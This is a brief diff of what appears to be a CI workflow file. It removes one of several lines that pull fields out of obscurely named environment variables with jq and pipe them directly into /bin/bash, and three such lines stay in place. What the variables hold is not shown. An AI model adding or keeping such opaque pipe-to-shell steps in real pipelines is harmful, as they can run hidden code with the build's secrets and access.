@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$kgw585" | jq -r .erqgc674 | /bin/bash
           printf '%s' "$qrws7" | jq -r .gsd6242 | /bin/bash
-          printf '%s' "$hwmex0" | jq -r .jl12192 | /bin/bash
           printf '%s' "$rrmnj733" | jq -r .w95566 | /bin/bash
 
       - name: Upload archive
